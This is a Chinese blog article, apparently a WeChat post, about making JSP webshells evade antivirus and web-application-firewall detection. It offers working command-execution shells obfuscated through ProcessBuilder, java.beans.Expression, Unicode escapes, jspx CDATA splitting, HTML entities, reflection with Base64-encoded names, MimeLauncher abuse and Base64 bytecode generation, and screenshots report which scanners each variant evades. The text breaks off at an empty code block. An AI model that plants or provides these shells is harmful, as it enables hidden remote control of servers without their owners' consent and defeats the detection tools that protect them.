<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&mid=2247494355&idx=1&sn=12911da8793840804b579bbb1f583ce6&chksm=c172fb42f6057254adaeae27180e4a1c5e08bfcf484e34df71c4962b93e488710c0ac5648e2c&scene=21&sessionid=1663302710&key=512fb80aa4f22d2a7e4e82caaf636183ac68eb897c1b733e42a406c7b5a5d9b4c96fa970b895e05367e4cc4942a477cec13956ea261fd75c912c56c51774c13eedb2f8ab2f19648fa2065766045bf578e53f36ed8dca00d8e236a6c4c5e16fa87a7d661f66271fe5cf80bdda22fb601889ae55d3663968b6324f390afaed88f2&ascene=15&uin=MTA3Mzc3OTIzNQ==&devicetype=Windows%20Server%202016%20x64&version=63070517&lang=zh_CN&session_us=gh_9c93932cfcf8&exportkey=AWPgqTNBufMFVYsJMgmR7Vg=&acctmode=0&pass_ticket=R58LBspgkWN4GZNrksEXuKC%20DztZBKT71Wl7X6eayJoE/k5KpZt13tqJaw1qT5mZ&wx_header=0&fontgear=2#wechat_redirect)

******点击****蓝****字 / 关注我们******

内置函数免杀
======

原始 webshell
-----------

```
<%@ page import="java.io.InputStream" %><%@ page import="java.io.BufferedReader" %><%@ page import="java.io.InputStreamReader" %><%@page language="java" pageEncoding="utf-8" %><%    String cmd = request.getParameter("cmd");    Process process = Runtime.getRuntime().exec(cmd);    InputStream is = process.getInputStream();    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));    String r = null;    while((r = bufferedReader.readLine())!=null){        response.getWriter().println(r);    }%>
```

查杀的点在于 Runtime.getRuntime().exec 非常明显的特征

利用 ProcessBuilder 替换 Runtime.getRuntime().exec(cmd)
---------------------------------------------------

Runtime.getRuntime().exec(cmd) 其实最终调用的是 ProcessBuilder 这个函数，因此我们可以直接利用 ProcessBuilder 来替换 Runtime.getRuntime().exec(cmd)，从而绕过正则表达式

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmra3sAM0YJLO3wL7h4V2NqdyVKxpJfBVzS6UXibOPZfNwfNUTG0W8LFibbw/640?wx_fmt=png)1.png

```
<%@ page import="java.io.InputStream" %><%@ page import="java.io.BufferedReader" %><%@ page import="java.io.InputStreamReader" %><%@page language="java" pageEncoding="utf-8" %><%  String cmd = request.getParameter("cmd");  Process process = new ProcessBuilder(new String[]{cmd}).start();  InputStream is = process.getInputStream();  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));  String r = null;  while((r = bufferedReader.readLine())!=null){    response.getWriter().println(r);  }%>
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmraial2BkJsYxXxLQZ7ibkuvkToZW7HvpRicAse3LWqCaA5efrHtUewUOb1g/640?wx_fmt=png)2.png

免杀效果

某狗:

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmrarjCbYsnQKhPGAou1e2mg1dp27eU1cpeiawxjibIDg0BXQBBn8zTpd4tw/640?wx_fmt=png)3.png 某盾:![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraCUa0hsjhySn8POTJMd6lphkHicjRibzib4KgLyTOwJnKMfMpx3lNzBicEw/640?wx_fmt=png)4.png 某马：![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmra7jadMic0ia0YBCicmuPZibiaYuA8Z1AILFaWMIaBnnw9QE5XUJ4ibicVSeagw/640?wx_fmt=png)5.pngvt：![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmrayVUV6P6l2KZ4JibTGhdJ7GCiaa6icXiaoGRDysCdot54iale4OwleCTWJYw/640?wx_fmt=png)6.png 某度在线查杀:![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraXBh4mcXmvYD0LN9TV1ACkxvficwGhmmYtMTu1ulf1rKHw5SnLoq1Rtg/640?wx_fmt=png)7.png

可以看到这全部都免杀过了，就换了一个函数。

BeansExpression 免杀
------------------

这种方式是利用 Expression 将 Runtime.getRuntime().exec 这个特征分开，相当于一个对调函数。免杀效果一般，因为很多查杀都是直接匹配 Runtime.getRuntime()

```
<%@ page import="java.beans.Expression" %><%@ page import="java.io.InputStreamReader" %><%@ page import="java.io.BufferedReader" %><%@ page import="java.io.InputStream" %><%@ page language="java" pageEncoding="UTF-8" %><%  String cmd = request.getParameter("cmd");  Expression expr = new Expression(Runtime.getRuntime(), "exec", new Object[]{cmd});  Process process = (Process) expr.getValue();  InputStream in = process.getInputStream();  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));  String tmp = null;  while((tmp = bufferedReader.readLine())!=null){    response.getWriter().println(tmp);  }%>
```

查杀效果：

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraKY5XaTxNYpib6BVeWFbeQiaphXq7zicwFLqctuQ2LLVGemCQ4nfPsRWoQ/640?wx_fmt=png)8.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraaoTk0v9zIjFiaaeE6Zz5R505mgQztByaTCpLYLeySqQTdlXa93xs8gQ/640?wx_fmt=png)9.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmraian9M2CcECdBqoGCIPnrkjnu9EDQOo68Js7kZ51nNXFj5ibFCa6JBNPA/640?wx_fmt=png)10.png

可以看到某狗已经查杀出来了。只能说效果很一般

编码免杀
====

Unicode 编码
----------

jsp 支持 unicode 编码，如果杀软不支持 unicode 查杀的话，基本上都能绕过

```
<%@ page language="java" contentType="text/html;charset=UTF-8" pageEncoding="UTF-8"%><%@ page import="java.io.*"%><%  \uuuu0053\uuuu0074\uuuu0072\uuuu0069\uuuu006e\uuuu0067\uuuu0020\uuuu0063\uuuu006d\uuuu0064\uuuu0020\uuuu003d\uuuu0020\uuuu0072\uuuu0065\uuuu0071\uuuu0075\uuuu0065\uuuu0073\uuuu0074\uuuu002e\uuuu0067\uuuu0065\uuuu0074\uuuu0050\uuuu0061\uuuu0072\uuuu0061\uuuu006d\uuuu0065\uuuu0074\uuuu0065\uuuu0072\uuuu0028\uuuu0022\uuuu0063\uuuu006d\uuuu0064\uuuu0022\uuuu0029\uuuu003b\uuuu0050\uuuu0072\uuuu006f\uuuu0063\uuuu0065\uuuu0073\uuuu0073\uuuu0020\uuuu0070\uuuu0072\uuuu006f\uuuu0063\uuuu0065\uuuu0073\uuuu0073\uuuu0020\uuuu003d\uuuu0020\uuuu0052\uuuu0075\uuuu006e\uuuu0074\uuuu0069\uuuu006d\uuuu0065\uuuu002e\uuuu0067\uuuu0065\uuuu0074\uuuu0052\uuuu0075\uuuu006e\uuuu0074\uuuu0069\uuuu006d\uuuu0065\uuuu0028\uuuu0029\uuuu002e\uuuu0065\uuuu0078\uuuu0065\uuuu0063\uuuu0028\uuuu0063\uuuu006d\uuuu0064\uuuu0029\uuuu003b\uuuu0049\uuuu006e\uuuu0070\uuuu0075\uuuu0074\uuuu0053\uuuu0074\uuuu0072\uuuu0065\uuuu0061\uuuu006d\uuuu0020\uuuu0069\uuuu0073\uuuu0020\uuuu003d\uuuu0020\uuuu0070\uuuu0072\uuuu006f\uuuu0063\uuuu0065\uuuu0073\uuuu0073\uuuu002e\uuuu0067\uuuu0065\uuuu0074\uuuu0049\uuuu006e\uuuu0070\uuuu0075\uuuu0074\uuuu0053\uuuu0074\uuuu0072\uuuu0065\uuuu0061\uuuu006d\uuuu0028\uuuu0029\uuuu003b\uuuu0042\uuuu0075\uuuu0066\uuuu0066\uuuu0065\uuuu0072\uuuu0065\uuuu0064\uuuu0052\uuuu0065\uuuu0061\uuuu0064\uuuu0065\uuuu0072\uuuu0020\uuuu0062\uuuu0075\uuuu0066\uuuu0066\uuuu0065\uuuu0072\uuuu0065\uuuu0064\uuuu0052\uuuu0065\uuuu0061\uuuu0064\uuuu0065\uuuu0072\uuuu0020\uuuu003d\uuuu0020\uuuu006e\uuuu0065\uuuu0077\uuuu0020\uuuu0042\uuuu0075\uuuu0066\uuuu0066\uuuu0065\uuuu0072\uuuu0065\uuuu0064\uuuu0052\uuuu0065\uuuu0061\uuuu0064\uuuu0065\uuuu0072\uuuu0028\uuuu006e\uuuu0065\uuuu0077\uuuu0020\uuuu0049\uuuu006e\uuuu0070\uuuu0075\uuuu0074\uuuu0053\uuuu0074\uuuu0072\uuuu0065\uuuu0061\uuuu006d\uuuu0052\uuuu0065\uuuu0061\uuuu0064\uuuu0065\uuuu0072\uuuu0028\uuuu0069\uuuu0073\uuuu0029\uuuu0029\uuuu003b\uuuu0053\uuuu0074\uuuu0072\uuuu0069\uuuu006e\uuuu0067\uuuu0020\uuuu0072\uuuu0020\uuuu003d\uuuu0020\uuuu006e\uuuu0075\uuuu006c\uuuu006c\uuuu003b\uuuu0077\uuuu0068\uuuu0069\uuuu006c\uuuu0065\uuuu0028\uuuu0028\uuuu0072\uuuu0020\uuuu003d\uuuu0020\uuuu0062\uuuu0075\uuuu0066\uuuu0066\uuuu0065\uuuu0072\uuuu0065\uuuu0064\uuuu0052\uuuu0065\uuuu0061\uuuu0064\uuuu0065\uuuu0072\uuuu002e\uuuu0072\uuuu0065\uuuu0061\uuuu0064\uuuu004c\uuuu0069\uuuu006e\uuuu0065\uuuu0028\uuuu0029\uuuu0029\uuuu0021\uuuu003d\uuuu006e\uuuu0075\uuuu006c\uuuu006c\uuuu0029\uuuu007b\uuuu0072\uuuu0065\uuuu0073\uuuu0070\uuuu006f\uuuu006e\uuuu0073\uuuu0065\uuuu002e\uuuu0067\uuuu0065\uuuu0074\uuuu0057\uuuu0072\uuuu0069\uuuu0074\uuuu0065\uuuu0072\uuuu0028\uuuu0029\uuuu002e\uuuu0070\uuuu0072\uuuu0069\uuuu006e\uuuu0074\uuuu006c\uuuu006e\uuuu0028\uuuu0072\uuuu0029\uuuu003b\uuuu007d%>
```

注意这里的 \ uuuu00 可以换成 \ uuuu00uuu... 可以跟多个 u 达到绕过的效果

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmradhQeCR7Xia0PkM29icd1hnkITM8g9cYpib5wlehlibF1TcLlq1P4cZr3zw/640?wx_fmt=png)1.png 将代码（除 page 以及标签）进行 unicode 编码，并条件到 <%%> 标签中，即可执行 webshell

在线 unicode 编码转换： https://3gmfw.cn/tools/unicodebianmazhuanhuanqi/

注意用此在线 unicode 编码后内容会存在 /ua ，需要手动删除，负责无法正常运行

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmraq5vYTekBftouTPVsVBxIXWtI316oRhowZEwrtcib7uLibpLXfLNV7kBA/640?wx_fmt=png)2.png

可以看到依旧执行成功

查杀效果：

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmrawDxk2Up0EyMPYN1PURoHPmubZKm4XLjibYDwKGjFmMUBtJBqbibLgSGA/640?wx_fmt=png)3.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmra0fCJTk3ssJ1KHfAbJDSqUwETpsdiczgRJJmicalDeUF7pejBdrPTqcmw/640?wx_fmt=png)4.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraMzB5Z5de4ehCibdUsAY1Mzu1GeaZAM05lufOYUgLW0ocBKjCBDymRUw/640?wx_fmt=png)5.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraLrQjIS9Lm3VLQ7zyRwhfaiaahvmuz2IgfIQzMwnS8CfiarWz5tuXjklw/640?wx_fmt=png)7.png

这个基本上是通杀了属实是，但由于特征过于明显，如果人工查杀的话，很容易被发现

CDATA 特性
--------

这里是要是利用 jspx 的进行进行免杀，jspx 其实就是 xml 格式的 jsp 文件

在 jspx 中，可以利用 jsp:scriptlet 来代替 <%%>

```
<%@ page import="java.io.InputStream" %><%@ page import="java.io.BufferedReader" %><%@ page import="java.io.InputStreamReader" %><%@page language="java" pageEncoding="utf-8" %><jsp:scriptlet>  String cmd = request.getParameter("cmd");  Process process = Runtime.getRuntime().exec(cmd);  InputStream is = process.getInputStream();  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));  String r = null;  while((r = bufferedReader.readLine())!=null){    response.getWriter().println(r);  }</jsp:scriptlet>
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmratHOVQy2VibKnWKxEyAV5xruFk2VFXliaokoA3PkXvr7RpyCkws5vymTw/640?wx_fmt=png)8.png

当 jsp:scriptlet 被过滤时可以利用 EL 表达式，达到绕过的效果

```
${Runtime.getRuntime().exec(param.cmd)}
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraibKBfJvvsCwFdLLjiaQiaPlYHT8BP6tZa7UDzdsfQicd7aX2ZiaWGFiaWkZg/640?wx_fmt=png)9.png

EL 表达式的 11 个隐含对象

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraEB7eSbz2jzSE1zJwjS1nibI7nc3iagf1oY30uAzCiapNumtDhibuiaH5cgQ/640?wx_fmt=png)10.png

其他情况：

```
利用命令空间改名去绕过<demo:root xmlns:bbb="http://java.sun.com/JSP/Page"  version="1.2"><demo:scriptlet>Runtime.getRuntime().exec(pageContext.request.getParameter("cmd"));</demo:scriptlet></demo:root>利用<jsp:expression>绕过<jsp:root xmlns:bbb="http://java.sun.com/JSP/Page"  version="1.2">   <jsp:expression>   Runtime.getRuntime().exec(pageContext.request.getParameter("cmd"));   </jsp:expression></jsp:root>
```

以上是 jsp 的一些特性，下面开始正式讲解 CDATA

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraG9UoqWvaL3LMIUQuKocWg4GTZXUWzX0AOL0Gcb8v3NH2ewlnX7QialA/640?wx_fmt=png)11.png

```
说人话就是<![CDATA[与]]>只要能配对就相互抵消，其他不变，因此就可以说多了一个混淆的方式，有点类似多行注释在一行中使用（sql注入绕过waf），但是这个特征可以将关键字，函数进行分割，让其能混淆的空间变的更大
```

下面是用 xml 格式的 jsp 文件

```
<?xml version="1.0" encoding="UTF-8"?><jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"          version="2.0">  <jsp:directive.page contentType="text/html"/>  <jsp:scriptlet>  String cmd = request.getParameter("cmd");  Process process = Runtime.getRuntime().exec(cmd);  java.io.InputStream is = process.getInputStream();  java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(is));  String r = null;  while((r = bufferedReader.readLine())!=null){    response.getWriter().println(r);  }</jsp:scriptlet></jsp:root>
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmrapPT88BUwrcZjfmJsu65ow0D8eY0rLOwYDrylTicZeIUibxX7pOXicV8VQ/640?wx_fmt=png)12.png

可以看到这里是能正常运行的，接下来文件使用 CDATA 进行混淆

```
<?xml version="1.0" encoding="UTF-8"?><jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"          version="2.0">  <jsp:directive.page contentType="text/html"/>  <jsp:scriptlet>  String cmd = requ<![CDATA[est.get]]>Parameter("cmd");  Process process = Ru<![CDATA[ntime.getRunt]]>ime().exec(cmd);  java.io.InputStream is = process.getInputStream();  java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(is));  String r = null;  while((r = bufferedReader.readLine())!=null){    response.getWriter().println(r);  }</jsp:scriptlet></jsp:root>
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmra4sxhdIiaCMT7Zjeh2rofrnvcXjypXeweMvicyqfFvt4AOiasc0MHx7e4g/640?wx_fmt=png)13.png

依旧是能成功运行的，但是我们可以 requst 和 Runtime 这些类名都被插入了 CDATA，从而消除了特征

免杀效果:

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmrauO9I8yOo0BUKY0KtbDO4fovXB3ibFicvZHJRHRGPvibuJQElCPNztI8Cw/640?wx_fmt=png)14.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmrawBOhRJjibyrPEevS8xzHBdhLRe7GwSar5NZkxDYJImga2icUkCEfkRpw/640?wx_fmt=png)15.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraJhib7xhkibIHVpKThMx0Yp2KicOicUDLKRXdQMDQW9AzOICK2dqPnfzGhA/640?wx_fmt=png)16.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmra64k4CABxoFKeyuMAicHrkUIdEbRu9uESmHkuDV5JgWvdWuHVHdK0LRg/640?wx_fmt=png)17.png

HTML 编码
-------

这里 HTML 编码免杀与 jspx 的特效有关，前面的 CDATA 设计到了 jspx 的相关知识，由此 CDATA 的免杀就在上文讲了

在 XML 里可以通过 html 实体编码来对特殊字符转义，jspx 同样继承了该特性，由此 jspx 就具有识别 html 实体编码，接下来我们就利用上面的免杀马进行进一步的混淆

```
<?xml version="1.0" encoding="UTF-8"?><jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"          version="2.0">  <jsp:directive.page contentType="text/html"/>  <jsp:scriptlet>  String cmd = requ<![CDATA[est.get]]>Parameter("cmd");  Process process = Ru<![CDATA[ntime.getRunt]]>ime().exec(cmd);  java.io.InputStream is = process.getInputStream();  java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(is));  String r = null;  while((r = bufferedReader.readLine())!=null){    response.getWriter().println(r);  }</jsp:scriptlet></jsp:root>
```

注意：含有 CDATA 的内容是不能进行 html 实体编码的，反之 html 实体编码后的内容也不能插入 CDATA，否则无法执行

在线 html 实体编码： https://www.qqxiuzi.cn/bianma/zifushiti.php

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmramImattPsOYBAgpxISueZOwpnMywfAtbOJG8ggG10BdHDyxibuz3aibpg/640?wx_fmt=png)18.png

可以看到依旧可以正常运行

反射免杀
====

本章主要讲解反射在 webhell 中的利用，以及反射绕过杀软的利用与原理

原始反射马
-----

```
<%@ page import="java.lang.reflect.Method" %><%@ page import="java.lang.reflect.Field" %><%@ page import="java.io.*" %><%@ page language="java" pageEncoding="UTF-8" %><%  String cmd = request.getParameter("cmd");  Class<?> rt =Class.forName("java.lang.Runtime");  Method runtimeMethod = rt.getMethod("getRuntime");  Method method = rt.getMethod("exec", String.class);  Object object = method.invoke(runtimeMethod.invoke(null),cmd);  Process process = (Process) object;  InputStream in = process.getInputStream();  InputStreamReader resultReader = new InputStreamReader(in);  BufferedReader stdInput = new BufferedReader(resultReader);  String s = null;  while ((s = stdInput.readLine()) != null) {    out.println(s);  }%>
```

免杀效果:

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraAwOKqvibnzA0MKSA56qTELwJadgf2SHxzcuzhY6NibbcLgYfuMwyjbGg/640?wx_fmt=png)1.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmraj7AItF3vCUryFxX53Ocb9fwlmUVGsicO2icUtYX42AXxYMsMjaMOep5Q/640?wx_fmt=png)2.png

特征太明显里面还有 java.lang.Runtime，getRuntime，exec 这些敏感内容，由于与反射相关的参数都是字符串，由此我们能操作的空间就很大了。

利用 base64 加解密敏感内容
-----------------

```
<%@ page import="java.lang.reflect.Method" %><%@ page import="java.io.*" %><%@ page import="java.util.Base64" %><%@ page language="java" pageEncoding="UTF-8" %><%  String cmd = request.getParameter(new String(Base64.getDecoder().decode("Y21k"),"utf-8"));  Class<?> rt =Class.forName(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlJ1bnRpbWU="),"utf-8"));  Method runtimeMethod = rt.getMethod(new String(Base64.getDecoder().decode("Z2V0UnVudGltZQ=="),"utf-8"));  Method method = rt.getMethod(new String(Base64.getDecoder().decode("ZXhlYw=="),"utf-8"), String.class);  Object object = method.invoke(runtimeMethod.invoke(null),cmd);  Process process = (Process) object;  InputStream is = process.getInputStream();  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));  String r = null;  while((r = bufferedReader.readLine())!=null){    response.getWriter().println(r);  }%>
```

免杀效果：

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraPiclqXjqOwkYWNaEf7nnzKqoAQfV7ve2R9Mkm5cFrTjRo2wnWIYQ3dQ/640?wx_fmt=png)3.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraI2OSt1mwNbte6thiaOzawGOw3IspF44aqyMzartq9UGibJzknCZDniaww/640?wx_fmt=png)4.png

通过测试发现并非查杀的是与反射相关的所有函数，而是匹配是否存在 getMethod 函数，因此我们只需将 getMethod 改为 getDeclaredMethod 即可

getDeclaredMethod 替换 getMethod
------------------------------

```
<%@ page import="java.lang.reflect.Method" %><%@ page import="java.io.*" %><%@ page import="java.util.Base64" %><%@ page language="java" pageEncoding="UTF-8" %><%  String cmd = request.getParameter(new String(Base64.getDecoder().decode("Y21k"),"utf-8"));  Class<?> rt =Class.forName(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlJ1bnRpbWU="),"utf-8"));  Method runtimeMethod = rt.getDeclaredMethod(new String(Base64.getDecoder().decode("Z2V0UnVudGltZQ=="),"utf-8"));  Method method = rt.getDeclaredMethod(new String(Base64.getDecoder().decode("ZXhlYw=="),"utf-8"), String.class);  Object object = method.invoke(runtimeMethod.invoke(null),cmd);  Process process = (Process) object;  InputStream is = process.getInputStream();  BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));  String r = null;  while((r = bufferedReader.readLine())!=null){    response.getWriter().println(r);  }%>
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraAuqkQDgol7n2spX6UndCqWKVsG3DMzLWmjbtJA1AedibM99RDXuyMEA/640?wx_fmt=png)5.png

可以看到正常运行

免杀效果：

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraU7sBWGm2hI10FTibl9GaI0YngEOKuM7tib5C3ReD3HxvFvkkahsKKaEA/640?wx_fmt=png)6.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraBl0icFYGI6B5fSKHR0bUyeiba5FPsaFXS3m6DTKMMjriaNhmA8X19YhbA/640?wx_fmt=png)7.png

可以看到某盾依旧查杀，经过测试某盾查杀的是当存在反射函数又存在 Process 类的 getInputStream 方法时会被查杀，这种情况下，笔者并未找到太好的办法，要么就这些不回显，要么就利用之前文章写的免杀技巧。

```
<%@ page import="java.lang.reflect.Method" %><%@ page import="java.io.*" %><%@ page import="java.util.Base64" %><%@ page language="java" pageEncoding="UTF-8" %><%  String cmd = request.getParameter(new String(Base64.getDecoder().decode("Y21k"),"utf-8"));  Class<?> rt =Class.forName(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlJ1bnRpbWU="),"utf-8"));  Method runtimeMethod = rt.getDeclaredMethod(new String(Base64.getDecoder().decode("Z2V0UnVudGltZQ=="),"utf-8"));  Method method = rt.getDeclaredMethod(new String(Base64.getDecoder().decode("ZXhlYw=="),"utf-8"), String.class);  Object object = method.invoke(runtimeMethod.invoke(null),cmd);%>
```

免杀效果：

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmrabge39DicbJ0DeE17kGgGFnECOxiaicrXhgj8gaHEUibRtEVbCArFuMfsQw/640?wx_fmt=png)8.png

sun.net.
--------

在 sun.net.www.MimeLauncher 中存在一个 run 方法，而该 run 方法存在命令执行漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmrao2ias8eBxnribgrJhkOB8JVrkhAChQwsOWEfLkYejsWcsBNiby6Z7iaflw/640?wx_fmt=png)9.png

本来打算将 MimeLauncher 放到前面内置函数免杀那篇文章上讲，由于 MimeLauncher 无法直接使用，需要借助反射进行调用，因此就笔者就将 MimeLauncher 放在反射免杀后讲，及本章

```
<%@ page import="java.io.*" %><%@ page import="java.net.URLConnection" %><%@ page import="java.net.URL" %><%@ page import="sun.net.www.MimeEntry" %><%@ page import="java.lang.reflect.Field" %><%@ page import="java.lang.reflect.Constructor" %><%@ page import="java.lang.reflect.Method" %><%@ page language="java" pageEncoding="UTF-8" %><%    String cmd = request.getParameter("cmd");    URLConnection urlConnection = new URL("http://127.0.0.1%s").openConnection();    MimeEntry mimeEntry = new MimeEntry("naihe");    Class meClass = MimeEntry.class;    Field field = meClass.getDeclaredField("command");    field.setAccessible(true);    Field field2 = meClass.getDeclaredField("tempFileNameTemplate");    field2.setAccessible(true);    field2.set(mimeEntry,"naihe%s567");    InputStream inputStream = new InputStream() {        @Override        public int read() throws IOException {            return -1;        }    };    Class mimeClass = Class.forName("sun.net.www.MimeLauncher");    Constructor mimeCon = mimeClass.getDeclaredConstructor(MimeEntry.class,URLConnection.class,            InputStream.class,String.class,String.class);    mimeCon.setAccessible(true);    Thread thread = (Thread) mimeCon.newInstance(mimeEntry, urlConnection, inputStream, "0","0");    Field field3 = mimeClass.getDeclaredField("execPath");    field3.setAccessible(true);    field3.set(thread,cmd);    Method m = mimeClass.getDeclaredMethod("run");    m.setAccessible(true);    m.invoke(thread);%>
```

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmrauYHcLetEmVsvFXNkSAlibGUibu3evJSHP5xuGLgVv5rRX4bKP7txOzicg/640?wx_fmt=png)10.png

类似 MimeLauncher 的类还有许多，适合大家去挖掘挖掘，利用时大概率会用到反射，就当练习练习反射相关的知识也是不错的选择

免杀效果：

![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0Jywxmra3MlgF7NO0e2RJwD7zILLTpchopkbZD4O2K24cH8zjWbj1JzficnclOA/640?wx_fmt=png)11.png![](https://mmbiz.qpic.cn/mmbiz_png/MjYYX9ahGV0K789Upul73dKf0JywxmraS2unyYyibbMPfeicdlvo9qhU9qbewLI7MKocXFELAic669Y9ahs4myAGA/640?wx_fmt=png)13.png

字节码免杀
=====

字节码生成
-----

### javac 生成字节码

这种方式简单的说就是用 ideal 将 java 文件编程成 class 文件，然后将 class 读取出来用 base64 编码即可，这种方式比较方便简单，不需要会使用 ASM，javassist 等字节码框架。

```
package com.demo;import java.io.*;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.nio.ByteBuffer;import java.nio.channels.FileChannel;import java.util.Base64;public class Demo {    public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException {        FileChannel fileChannel = null;        FileInputStream in = null;        in = new FileInputStream("C:\\Users\\12107\\Desktop\\免杀\\target\\classes\\com\\demo\\Shell.class");        fileChannel = in.getChannel();        ByteBuffer buffer = ByteBuffer.allocate((int) fileChannel.size());        while (fileChannel.read(buffer) > 0) {        }        System.out.println(new String(Base64.getEncoder().encode(buffer.array())));    \}\}
```

Shell.java

```
package com.demo;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;public class Shell {    public static String runs(String cmd) throws IOException {        Process process = Runtime.getRuntime().exec(cmd);        InputStream is = process.getInputStream();        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));        String r = "";        String s = "";        while((r = bufferedReader.readLine())!=null){            s += r;        }        return s;    \}\}
```

### javassist 生成字节码

javassist 是生成修改字节码的框架，使用比 ASM 更简洁，但是并非 jvm 自带的库，也是笔者非常喜欢的一个框架。

```
package com.demo;import javassist.*;import java.io.IOException;import java.util.Base64;public class Demo2 {    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException {        ClassPool classPool = ClassPool.getDefault();        CtClass cc1 = classPool.makeClass("com.demo.Shell");        CtConstructor cons = new CtConstructor(new CtClass[]{},cc1);        cons.setBody("{}");        String runCode1="{}";        cons.insertBefore((runCode1));        cc1.addConstructor(cons);        CtMethod cm2 = new CtMethod(ClassPool.getDefault().get("java.lang.String"), "runs", new CtClass[]{classPool.get("java.lang.String")}, cc1);        cm2.setModifiers(Modifier.PUBLIC);        cm2.setBody("{        Process process = Runtime.getRuntime().exec($1);\n" +                "        java.io.InputStream is = process.getInputStream();\n" +                "        java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(is));\n" +                "        String r = \"\";\n" +                "        String s = \"\";\n" +                "        while((r = bufferedReader.readLine())!=null){\n" +                "            s += r;\n" +                "        }\n" +                "        return s;}");        cc1.addMethod(cm2);        System.out.println(new String(Base64.getEncoder().encode(cc1.toBytecode())));    \}\}
```

### ASM 生成字节码

ASM 相比 javassist 操作更复杂，但是 jvm 自带，利用面非常广

```
